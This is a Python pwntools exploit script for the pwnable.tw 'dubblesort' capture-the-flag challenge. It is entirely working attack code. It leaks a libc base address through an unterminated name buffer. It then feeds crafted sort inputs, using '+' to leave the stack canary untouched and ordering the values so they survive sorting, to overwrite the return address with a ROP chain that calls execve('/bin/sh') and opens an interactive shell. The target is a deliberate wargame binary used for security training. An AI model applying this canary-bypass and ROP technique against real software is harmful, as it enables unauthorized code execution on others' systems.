#!/usr/bin/env python3

from pwn import *

class Exploit:
    def __init__(self):
        self.QWORD = 4

    def conn(self):
        self.libc = ELF('./given/libc_32.so.6')
        if args.REMOTE:
            return remote('chall.pwnable.tw', 10101)

        self.elf = ELF('./pwninit/dubblesort_patched')
        self.ld = ELF('./pwninit/ld-2.23.so')

        p = process([self.ld.path, self.elf.path], env={
            'LD_PRELOAD': self.libc.path
        })
        if args.GDB:
            context.terminal = ['tmux', 'splitw', '-h']
            with open(f'/proc/{p.pid}/maps', 'rb') as f:
                maps = f.read()
                f.close()
            regions = maps.split(b'\n')
            pie_base = None
            for region in regions:
                if b'dubblesort_patched' in region:
                    pie_base = int(region[:region.find(b'-')], 16)
                    break
            if pie_base is None:
                quit()
            gdb.attach(
                p,
                '\n'.join([
                    f'b *{hex(pie_base + 0xb17)}',
                    f'b *{hex(pie_base + 0xac1)}',
                ])
            )
        return p

    def exploit(self):
        self.p = self.conn()

        # First phase, leak libc via name buffer
        OFFSET = 0x1b0000
        self.libc.address = self._leak_libc() - OFFSET
        log.info(f'libc_base: {hex(self.libc.address)}')

        # Second phase: construct a sorted payload for exploit
        rop_chain = self._get_rop_chain()
        overwritten_length = 0x7c + self.QWORD + len(rop_chain) * self.QWORD
        times = overwritten_length // self.QWORD
        log.info(f'will iterate {times} times')

        self.p.sendafter(b'How many numbers do you what to sort :',
                         str(times).encode() + b'\n')

        for offset in range(0, overwritten_length, self.QWORD):
            i = offset // self.QWORD
            msg = f'Enter the {i} number :'.encode()
            if offset < 0x60:
                self.p.sendlineafter(msg, b'0')
            elif offset == 0x60:
                self.p.sendlineafter(msg, b'+') # use initial data
            elif offset < 0x80:
                big_num = 0xeeeeeeee
                self.p.sendlineafter(msg, str(big_num).encode())
            else:
                idx = i - 0x80 // self.QWORD
                self.p.sendlineafter(msg, str(rop_chain[idx]).encode())

        # self.debug_sorted_string(times)

        self.p.interactive()


    def debug_sorted_string(self, times):
        self.p.recvuntil(b'Result :\n')
        nums = self.p.recvrepeat(2.0)
        nums = nums.split(b' ')
        for i, num in enumerate(nums):
            if i >= times:
                break
            print(f'{i} {hex(int(num.decode()))}')


    def _get_rop_chain(self):
        assert self.libc.address != 0
        ret = self.libc.address + 0xaf3e7
        execve = self.libc.symbols['execve']
        binsh = next(self.libc.search(b'/bin/sh\x00'))

        log.info('execve offset: ' + hex(execve - self.libc.address))
        return [ret, execve, binsh, binsh]

    def _leak_libc(self) -> int:
        """We got a leak of writable section.
        It seems reliable to calculate the base address
        """
        if args.REMOTE:
            offset = 0x1c + 1
        else:
            offset = 0x18 + 1

        padding = b'a' * offset
        self.p.sendafter(
            b'What your name :',
            padding
        )
        self.p.recvuntil(padding)
        leak = self.p.recvn(self.QWORD - 1)
        leak_address = u32(b'\x00' + leak)
        log.info(f'leak address: {hex(leak_address)}')
        return leak_address

if __name__ == '__main__':
    exploit = Exploit()
    exploit.exploit()
